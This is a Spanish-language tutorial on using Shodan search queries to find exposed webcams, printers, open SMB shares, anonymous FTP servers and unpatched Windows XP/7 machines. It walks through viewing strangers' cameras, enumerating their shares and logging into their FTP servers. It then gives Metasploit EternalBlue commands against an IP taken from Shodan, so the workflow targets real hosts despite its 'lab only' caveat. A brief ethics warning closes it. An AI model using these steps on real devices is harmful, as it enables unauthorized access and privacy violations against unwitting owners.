
## Introducción: ¿Qué es Shodan?

¡Hola a todos! Hoy vamos a sumergirnos en **Shodan**, una herramienta increíblemente potente que funciona como un motor de búsqueda para dispositivos conectados a internet. Con Shodan puedes encontrar desde **webcams sin protección**, pasando por **servidores**, hasta **ordenadores con sistemas vulnerables**. Básicamente, cualquier cosa con una IP pública y puertos abiertos puede aparecer aquí.

En esta guía te voy a mostrar:
1. **Búsquedas básicas** en Shodan.
2. **Dorks avanzados** para filtrar resultados específicos.
3. Cómo encontrar **sistemas vulnerables** (como Windows XP o 7).
4. Ejemplos prácticos de **webcams e impresoras** accesibles.

Así que, ¡vamos a ello!

---

## Paso 1: Primeros Pasos en Shodan
### Acceso a la Plataforma
- **URL**: [shodan.io](https://www.shodan.io/)
- Lo ideal es crear una cuenta o iniciar sesión (por ejemplo, con Google) para aprovechar al máximo las funcionalidades.
- Una vez dentro, verás un buscador simple en la interfaz.

### Búsqueda Básica: Webcams
Imagina que queremos encontrar **webcams conectadas a internet**. En el buscador, escribe:

```
webcam
```

- **Resultado**: Shodan te mostrará webcams de todo el mundo. Algunas requieren autenticación, pero otras no.
- **Ejemplo práctico**:
  - Una webcam en Japón grabando una calle en tiempo real (puerto 8889).
  - Otra en EE.UU. enfocando un periquito en una jaula.

**Filtro por País**: Si quiero webcams solo en España:
1. Haz clic en "More" (Más opciones).
2. Añade el filtro: `country:ES`.
3. Resultado: Lista reducida de webcams españolas, algunas protegidas y otras abiertas.

---

## Paso 2: Usando Dorks para Búsquedas Avanzadas

Un **dork** es una consulta específica que filtra resultados en Shodan. Vamos con ejemplos claros:

### Dork 1: Webcams con Software Específico

- **Query**: `webcamxp`
- **Explicación**: Busca webcams que usen el software **WebcamXP**, conocido por tener muchas instancias sin contraseña.
- **Ejemplo**:
  - Encuentras una webcam en EE.UU. (puerto 8080) que muestra una calle oscura (porque allá es de noche).
  - Otra en una oficina, accesible por el puerto 80 o 3478.
- **Dato extra**: Puedes verificar los puertos abiertos con herramientas como `nmap`, pero Shodan ya te los lista:
  - Comando: `sudo nmap -p 3478,8080,8090 <IP>`
  - Resultado: Confirma que esos puertos están abiertos.

### Dork 2: Sistemas Operativos Obsoletos

- **Query**: `os:Windows XP`
- **Explicación**: Encuentra dispositivos con Windows XP, un sistema obsoleto y vulnerable (por ejemplo, a **EternalBlue**).
- **Ejemplo**:
  - Una máquina XP con el puerto 445 abierto, marcada como "vulnerable a MS17-010" (EternalBlue).
  - Shodan incluso muestra recursos compartidos accesibles sin autenticación.
- **Por qué importa**: Estos sistemas son un riesgo si están expuestos en la red.

- **Variación**: `os:Windows 7`
  - Similar a XP, muchos son vulnerables a EternalBlue. Algunos resultados incluyen capturas de pantalla de la pantalla de login.

### Dork 3: Webcams con Software JCam

- **Query**: `server:jcam`
- **Explicación**: Busca webcams que usen el software JCam, frecuentemente sin protección.
- **Ejemplo**:
  - Una webcam en una fábrica industrial.
  - Otra enfocando un garaje.

### Dork 4: Impresoras HP

- **Query**: `HP printer`
- **Explicación**: Localiza impresoras HP conectadas a internet.
- **Ejemplo**:
  - Una impresora accesible por su IP pública. Algunas piden autenticación, otras no.

### Dork 5: Recursos Compartidos sin Autenticación

- **Query**: `port:445 -authentication`
- **Explicación**: Busca equipos con el puerto 445 (SMB) abierto y sin protección.
- **Ejemplo**:
  - Una IP en India con recursos compartidos visibles.
  - Prueba: Con `smbclient -L <IP>` en Kali Linux, listas los recursos sin contraseña.

### Dork 6: FTP Anónimo

- **Query**: `port:21 anonymous`
- **Explicación**: Encuentra servidores FTP que permitan acceso anónimo.
- **Ejemplo**:
  - IP con `vsftpd` (versión 3.0.2). Conexión:

    ```
    ftp <IP>
    Usuario: anonymous
    Contraseña: [en blanco]
    ```
    
  - Resultado: Acceso al contenido del servidor FTP (en este caso, vacío, pero funcional).

---

## Paso 3: Explotación de Vulnerabilidades (Ejemplo Educativo)

**Nota**: Esto se hace solo en entornos de laboratorio controlados, ¡nunca en la red real sin permiso!

### Caso: Máquina Windows 7 + EternalBlue

- **Herramienta**: Metasploit
- **Pasos**:
  1. Busca en Shodan: `os:Windows 7 port:445`.
  2. Encuentras una IP marcada como "vulnerable a MS17-010".
  3. En Metasploit:

     ```
     use exploit/windows/smb/ms17_010_eternalblue
     set RHOST <IP>
     run
     ```
     
  4. Resultado: Acceso como administrador sin credenciales.

- **Por qué funciona**: El puerto 445 en versiones antiguas de Windows tiene fallos explotables.

---

## Paso 4: Consejos y Advertencias

- **Ética**: No escanees ni accedas a dispositivos sin permiso. Shodan recopila datos públicos, pero actuar sobre ellos puede ser ilegal.
- **Seguridad**: Si tienes dispositivos en la red, ¡protégelos! Usa contraseñas fuertes y actualiza el software.

---
